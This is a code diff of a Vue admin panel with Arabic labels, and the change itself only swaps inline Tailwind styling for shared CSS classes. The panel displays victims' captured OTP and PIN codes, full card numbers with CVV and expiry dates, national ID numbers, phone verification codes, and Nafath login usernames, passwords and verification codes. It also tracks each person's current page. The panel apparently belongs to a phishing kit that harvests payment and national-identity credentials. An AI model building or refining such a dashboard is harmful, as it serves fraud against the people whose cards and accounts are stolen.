@@ -23,10 +23,10 @@
     </div>
 
     <!-- Content -->
-    <div v-else-if="customer" class="p-5 space-y-5">
+    <div v-else-if="customer" class="space-y-5">
 
       <!-- Customer Info Header -->
-      <div class="flex items-center gap-4 p-4 rounded-xl bg-gray-800/60 border border-gray-700/50">
+      <div class="admin-glass flex items-center gap-4">
         <div class="w-12 h-12 rounded-full bg-blue-500/20 flex items-center justify-center">
           <i class="fa-solid fa-user text-blue-400 text-lg"></i>
         </div>
@@ -56,19 +56,19 @@
           <i class="fa-solid fa-key text-amber-400"></i> رمز OTP
         </h5>
         <div class="grid grid-cols-2 gap-3">
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الرمز</p>
             <p class="text-sm font-medium text-amber-300">{{ customer.latest_otp.code || customer.latest_otp.code_value || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الحالة</p>
             <p class="text-sm font-medium text-gray-200">{{ statusLabel(customer.latest_otp.status) }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الهاتف</p>
             <p class="text-sm font-medium text-gray-200" dir="ltr">{{ customer.latest_otp.phone_number || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الوقت</p>
             <p class="text-sm font-medium text-gray-200">{{ formatTime(customer.latest_otp.created_at) }}</p>
           </div>
@@ -81,15 +81,15 @@
           <i class="fa-solid fa-credit-card text-purple-400"></i> رقم PIN
         </h5>
         <div class="grid grid-cols-2 gap-3">
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الرمز</p>
             <p class="text-sm font-medium text-amber-300">{{ customer.latest_pin.code || customer.latest_pin.code_value || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الحالة</p>
             <p class="text-sm font-medium text-gray-200">{{ statusLabel(customer.latest_pin.status) }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الوقت</p>
             <p class="text-sm font-medium text-gray-200">{{ formatTime(customer.latest_pin.created_at) }}</p>
           </div>
@@ -102,29 +102,29 @@
           <i class="fa-solid fa-wallet text-green-400"></i> بطاقة الدفع
         </h5>
         <div v-for="(card, idx) in customer.payment.cards.slice(0, 1)" :key="card.id || idx"
-          class="rounded-xl p-4 bg-gradient-to-br from-blue-600/30 to-blue-800/30 border border-blue-500/20">
+          class="admin-glass admin-glass--blue">
           <div class="grid grid-cols-2 gap-3">
-            <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+            <div class="admin-data-cell">
               <p class="text-[11px] text-gray-500 mb-1">اسم حامل البطاقة</p>
               <p class="text-sm font-medium text-gray-200">{{ card.holder_name || card.card_holder || '—' }}</p>
             </div>
-            <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+            <div class="admin-data-cell">
               <p class="text-[11px] text-gray-500 mb-1">نوع البطاقة</p>
               <p class="text-sm font-medium text-gray-200">{{ card.card_type || '—' }}</p>
             </div>
-            <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+            <div class="admin-data-cell">
               <p class="text-[11px] text-gray-500 mb-1">رقم البطاقة</p>
               <p class="text-sm font-medium text-amber-300" dir="ltr">{{ card.card_number || card.card_number_full || '—' }}</p>
             </div>
-            <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+            <div class="admin-data-cell">
               <p class="text-[11px] text-gray-500 mb-1">CVV</p>
               <p class="text-sm font-medium text-amber-300">{{ card.cvv || '—' }}</p>
             </div>
-            <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+            <div class="admin-data-cell">
               <p class="text-[11px] text-gray-500 mb-1">تاريخ الانتهاء</p>
               <p class="text-sm font-medium text-gray-200" dir="ltr">{{ card.expiry_month && card.expiry_year ? `${card.expiry_month}/${card.expiry_year}` : '—' }}</p>
             </div>
-            <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+            <div class="admin-data-cell">
               <p class="text-[11px] text-gray-500 mb-1">الحالة</p>
               <p class="text-sm font-medium text-gray-200">{{ statusLabel(card.status) }}</p>
             </div>
@@ -138,19 +138,19 @@
           <i class="fa-solid fa-phone text-cyan-400"></i> تحقق هاتفي
         </h5>
         <div class="grid grid-cols-2 gap-3">
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الرمز</p>
             <p class="text-sm font-medium text-amber-300">{{ customer.latest_phone_otp.code || customer.latest_phone_otp.code_value || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الحالة</p>
             <p class="text-sm font-medium text-gray-200">{{ statusLabel(customer.latest_phone_otp.status) }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الهاتف</p>
             <p class="text-sm font-medium text-gray-200" dir="ltr">{{ customer.latest_phone_otp.phone_number || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الوقت</p>
             <p class="text-sm font-medium text-gray-200">{{ formatTime(customer.latest_phone_otp.created_at) }}</p>
           </div>
@@ -163,27 +163,27 @@
           <i class="fa-solid fa-user-plus text-blue-400"></i> معلومات العميل
         </h5>
         <div class="grid grid-cols-2 gap-3">
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الاسم</p>
             <p class="text-sm font-medium text-gray-200">{{ customer.fullName || customer.full_name || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الهوية</p>
             <p class="text-sm font-medium text-gray-200">{{ customer.nationalId || customer.national_id || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الهاتف</p>
             <p class="text-sm font-medium text-gray-200" dir="ltr">{{ customer.phoneNumber || customer.phone_number || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الصفحة الحالية</p>
             <p class="text-sm font-medium text-gray-200">{{ customer.journey?.current_page || customer.current_page || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">الجهاز</p>
             <p class="text-sm font-medium text-gray-200">{{ customer.device_info?.type || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">المتصفح</p>
             <p class="text-sm font-medium text-gray-200">{{ customer.device_info?.browser || '—' }}</p>
           </div>
@@ -192,7 +192,7 @@
 
       <!-- Generic fallback for policy/claim/alert/system types -->
       <div v-if="!['otp','pin','payment','phone','customer'].includes(notification?.type)" class="space-y-3">
-        <div class="p-4 rounded-xl bg-gray-800/60 border border-gray-700/50 text-center">
+        <div class="admin-glass text-center">
           <p class="text-sm text-gray-300">{{ notification?.message }}</p>
           <p class="text-xs text-gray-500 mt-2">{{ notification?.time }}</p>
         </div>
@@ -204,19 +204,19 @@
           <i class="fa-solid fa-fingerprint text-indigo-400"></i> نفاذ
         </h5>
         <div class="grid grid-cols-2 gap-3">
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">المستخدم</p>
             <p class="text-sm font-medium text-gray-200">{{ customer.nafath.username || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">كلمة المرور</p>
             <p class="text-sm font-medium text-amber-300">{{ customer.nafath.password || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">رمز التحقق</p>
             <p class="text-sm font-medium text-amber-300">{{ customer.nafath.verification_code || '—' }}</p>
           </div>
-          <div class="rounded-lg bg-gray-800/80 border border-gray-700/40 p-3">
+          <div class="admin-data-cell">
             <p class="text-[11px] text-gray-500 mb-1">التحقق</p>
             <p class="text-sm font-medium text-gray-200">{{ customer.nafath.verified ? 'تم التحقق ✓' : 'لم يتم' }}</p>
           </div>
